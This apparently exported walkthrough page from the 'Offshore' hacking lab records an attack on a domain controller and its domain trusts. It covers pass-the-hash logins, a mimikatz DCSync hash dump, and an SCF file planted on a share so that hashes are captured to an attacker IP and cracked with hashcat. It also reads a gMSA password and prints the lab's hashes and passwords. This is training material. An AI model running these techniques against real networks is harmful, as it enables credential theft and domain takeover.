<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>DC03 - 172.16.3.5</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>DC03 - 172.16.3.5</h1><br/><p><a href="Offshore--DC03_-_172.16.3.5_23.html#OFS-Flag27">Flag 27</a></p><p><a href="Offshore--DC03_-_172.16.3.5_23.html#OFS-Flag29">Flag 29</a></p><p><a href="Offshore--DC03_-_172.16.3.5_23.html#OFS-Flag30">Flag 30</a></p><p><a href="Offshore--DC03_-_172.16.3.5_23.html#OFS-Offshore_AdmCreds">Credentials for client\offshore_adm</a></p><p><a href="Offshore--DC03_-_172.16.3.5_23.html#OFS-SVC_Client_secCreds">Credentials for client\svc_client_sec$</a></p><p></p><p>Evil-WinRM into DC03 and grab the flag</p><p></p><p><code><span style="background-color:#000000;">└─$ evil-winrm -i 172.16.3.5 -u administrator -H &#39;f2594c9e60abf7e28e7601db343a7e24&#39;</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Evil-WinRM shell v3.4</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Info: Establishing connection to remote endpoint</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; type ..\Desktop\flag.txt</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><a name="OFS-Flag27"></a><strong><span style="color:#ed333b;">OFFSHORE{w@tch_th0s3_3xtra_$ids}</span></strong></p><p></p><p>Check for trusts</p><p></p><p><code><span style="background-color:#000000;">PS C:\temp&gt; Get-DomainTrust -Domain admin.offshore.com</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">SourceName      : ADMIN.OFFSHORE.COM</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">TargetName      : dev.ADMIN.OFFSHORE.COM</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">TrustType       : WINDOWS_ACTIVE_DIRECTORY</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">TrustAttributes : WITHIN_FOREST</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">TrustDirection  : Bidirectional</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">WhenCreated     : 5/31/2018 10:24:17 PM</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">WhenChanged     : 5/3/2023 7:09:44 AM</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">SourceName      : ADMIN.OFFSHORE.COM</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">TargetName      : CLIENT.OFFSHORE.COM</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">TrustType       : WINDOWS_ACTIVE_DIRECTORY</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">TrustAttributes : TREAT_AS_EXTERNAL,FOREST_TRANSITIVE</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">TrustDirection  : Bidirectional</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">WhenCreated     : 6/15/2018 7:10:35 PM</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">WhenChanged     : 5/3/2023 7:10:16 AM</span></code></p><p></p><p>Ping to get our IP range</p><p></p><p><code><span style="background-color:#000000;">PS C:\temp&gt; ping client.offshore.com</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Pinging client.offshore.com [172.16.4.5] with 32 bytes of data:</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Reply from 172.16.4.5: bytes=32 time&lt;1ms TTL=127</span></code></p><p></p><p>Bloodhound dump</p><p></p><p><code><span style="background-color:#000000;">PS C:\temp&gt; Invoke-BloodHound -CollectionMethod all -Domain client.offshore.com</span></code></p><p></p><p>Looking through the GPOs that are applied on the client.offshore.com domain we can see one called Flag</p><p></p><p><img src="images/23-1.png" alt="images/23-1.png" /></p><p></p><p>You can get the text of this by right clicking and backing it up</p><p></p><p><img src="images/23-2.png" alt="images/23-2.png" /></p><p></p><p><a name="OFS-Flag29"></a><code><span style="background-color:#000000;">OFFSHORE{d0nt_overl00k_gp0}</span></code></p><p></p><p>Taking a look at the users in client.offshore.com</p><p></p><p><img src="images/23-3.png" alt="images/23-3.png" /></p><p></p><p>In the description of client_banking there is another flag</p><p><a name="OFS-Flag30"></a><code><span style="background-color:#000000;">OFFSHORE{h1dd3n_1n_pl@iN_$1ght}</span></code></p><p></p><p></p><p>Do a hashdump with mimikatz.exe lsadump::dcsync /all /csv</p><p></p><p><code><span style="background-color:#000000;">502	krbtgt	ea9112d4beb759907688c9e267eff246	514</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">1107	MS01$	db505645b78f70ae01dd6cebbe4b2b8b	4096</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">3113	bankvault	0ce1cb01ade331cdba32d0e1fba338a1	512</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">1000	DC03$	a309490aabcffeea561fb1d8b36607d0	532480</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">1108	WS04$	2abf50d13b5e08b92ac2d90c1d125b99	4096</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">3101	DEV$	49acc9c76b18bcd39b256d3882c4cf0e	2080</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">3104	CLIENT$	9d866488a63dfcca510faf2214937fdf	2080</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">500	Administrator	f2594c9e60abf7e28e7601db343a7e24	512</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">13101	pwner	bb81d3d5d69b8e27d76484303d1d2447	512</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">13102	agent	8119935c5f7fa5f57135620c8073aaca	66048</span></code></p><p></p><p>Using Crackmapexec we can see admin\bankvault has write permissions to a share in Client\MS02</p><p></p><p><code><span style="background-color:#000000;">└─$ crackmapexec smb 172.16.4.31 -u &#39;bankvault&#39; -H &#39;0ce1cb01ade331cdba32d0e1fba338a1&#39; -d &#39;admin.offshore.com&#39; --shares</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">/home/user/.pyenv/versions/3.8.1/lib/python3.8/site-packages/paramiko/transport.py:219: CryptographyDeprecationWarning: Blowfish has been deprecated</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">  &quot;class&quot;: algorithms.Blowfish,</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">SMB         172.16.4.31     445    MS02             [*] Windows Server 2016 Standard 14393 x64 (name:MS02) (domain:admin.offshore.com) (signing:False) (SMBv1:True)</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">SMB         172.16.4.31     445    MS02             [+] admin.offshore.com\bankvault 0ce1cb01ade331cdba32d0e1fba338a1 </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">SMB         172.16.4.31     445    MS02             [+] Enumerated shares</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">SMB         172.16.4.31     445    MS02             Share           Permissions     Remark</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">SMB         172.16.4.31     445    MS02             -----           -----------     ------</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">SMB         172.16.4.31     445    MS02             ADMIN$                          Remote Admin</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><strong><code><span style="color:#ed333b;background-color:#000000;">SMB         172.16.4.31     445    MS02             Banking_Data    READ,WRITE      </span></code></strong><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">SMB         172.16.4.31     445    MS02             C$                              Default share</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">SMB         172.16.4.31     445    MS02             IPC$                            Remote IPC</span></code></p><p></p><p><a href="https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication">https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication</a></p><p>Let&#39;s try to make an SCF that will reach out to our attack machine when the user logs on</p><p></p><p><code><span style="background-color:#000000;">└─$ cat stealhash.scf    </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[Shell]</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">IconFile=\\10.10.16.94\share\pentestlab.ico</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[Taskbar]</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Command=ToggleDesktop </span></code></p><p></p><p><code><span style="background-color:#000000;">└─$ smbclient.py -hashes aad3b435b51404eeaad3b435b51404ee:0ce1cb01ade331cdba32d0e1fba338a1 &#39;ADMIN.offshore.com/bankvault@172.16.4.31&#39;</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Impacket v0.9.22.dev1+20200914.131346.64ce465 - Copyright 2020 SecureAuth Corporation</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Type help for list of commands</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"># use Banking_Data</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"># put stealhash.scf</span></code></p><p></p><p>Start responder - sudo responder -I tun0 and after a minute or two we get this</p><p></p><p><code><span style="background-color:#000000;">[SMB] NTLMv2-SSP Client   : 10.10.110.3</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[SMB] NTLMv2-SSP Username : CLIENT\offshore_adm</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[SMB] NTLMv2-SSP Hash     : offshore_adm::CLIENT:80ffa84c900ed72f:62320D1008A83DC867AFC290B1F8A043:01010000000000000089C3FBC77DD901A09C1DC960C92C3000000000020008004F0053004C004A0001001E00570049004E002D004900580033005500580055005100570032003300430004003400570049004E002D00490058003300550058005500510057003200330043002E004F0053004C004A002E004C004F00430041004C00030014004F0053004C004A002E004C004F00430041004C00050014004F0053004C004A002E004C004F00430041004C00070008000089C3FBC77DD90106000400020000000800300030000000000000000000000000200000BF7C5E99EF4CA006B412380DBECFEABD190457C5150EE5EA7B15172757C44B530A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00390034000000000000000000 </span></code></p><p></p><p>Run hashcat on this</p><p></p><p><code><span style="background-color:#000000;">hashcat -a 0 -m 5600 offshore_adm.txt rockyou.txt --force</span></code></p><p></p><p>We get offshore_adm&#39;s password</p><p><a name="OFS-Offshore_AdmCreds"></a><code><span style="background-color:#000000;">Banker!123</span></code></p><p></p><p>Offshore_adm can read the password for the managed service account</p><p></p><p><img src="images/23-4.png" alt="images/23-4.png" /></p><p></p><p>We can read the password with <a href="https://github.com/MichaelGrafnetter/DSInternals/releases">DSInternals</a></p><p></p><p><img src="images/23-5.png" alt="images/23-5.png" /></p><p></p><p><code><span style="background-color:#000000;">PS C:\temp&gt; $username = &#39;client\offshore_adm&#39;</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">$pass = convertto-securestring &quot;Banker!123&quot; -asplaintext -force</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">$cred = new-object system.management.automation.pscredential($username, $pass)</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">$gMSA = Get-ADServiceAccount -Identity &#39;svc_client_sec$&#39; -Properties &#39;msDS-ManagedPassword&#39; -server 172.16.4.5 -credential $cred</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">$msDSMP_blob = $gMSA.&#39;msDS-ManagedPassword&#39;</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">$CleartextPassword = ConvertFrom-ADManagedPasswordBlob $msDSMP_blob</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">ConvertTo-NTHash $CleartextPassword.SecureCurrentPassword</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><a name="OFS-SVC_Client_secCreds"></a>b23930001d1bfeed9ad9e1b8f34909c1 / svc_client_sec$</p><p></p><p>Check this user on MS02 and it&#39;s an administrator</p><p></p><p><code><span style="background-color:#000000;">crackmapexec smb 172.16.4.31 -u &#39;svc_client_sec$&#39; -H &#39;b23930001d1bfeed9ad9e1b8f34909c1&#39; -d &#39;client.offshore.com&#39;</span></code></p><p></p><p><img src="images/23-6.png" alt="images/23-6.png" /></p><p></p><p></p><p></p></div>
</body>
</html>
